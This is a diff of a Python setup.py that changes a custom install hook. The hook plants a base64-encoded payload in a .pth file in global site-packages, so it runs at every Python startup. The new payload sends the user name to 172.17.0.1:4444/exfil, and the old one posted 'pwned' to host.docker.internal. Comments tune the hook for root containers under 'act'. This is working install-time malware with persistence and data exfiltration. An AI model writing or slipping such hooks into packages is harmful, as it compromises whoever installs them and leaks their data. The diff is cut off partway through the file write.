@@ -1,26 +1,18 @@
-import os
-import base64
-import subprocess
-import sys
+import os, base64, site
 from setuptools import setup
 from setuptools.command.install import install
 
 class CustomInstall(install):
     def run(self):
         install.run(self)
-        # Force Python to tell us where the site-packages are
         try:
-            import site
-            # Use the user-level site packages for better reliability in containers
-            target_dir = site.getusersitepackages()
-            if not os.path.exists(target_dir):
-                os.makedirs(target_dir)
-            
+            # We target the global site-packages since act runs as root
+            target_dir = site.getsitepackages()[0]
             pth_file = os.path.join(target_dir, "internal_init.pth")
             
-            # Use 'host.docker.internal' - This is a special DNS name that 
-            # Docker uses to resolve the Host IP from inside a container.
-            payload = "import os, requests; requests.post('http://host.docker.internal:4444', data={'status':'pwned','user':os.getlogin()})"
+            # USE THE IP FROM STEP 1 HERE (e.g., 172.17.0.1)
+            # We use a simple GET request for maximum reliability
+            payload = "import os, requests; requests.get('http://172.17.0.1:4444/exfil?data=' + os.environ.get('USER','none'))"
             b64_payload = base64.b64encode(payload.encode()).decode()
             
             with open(pth_file, "w") as f:
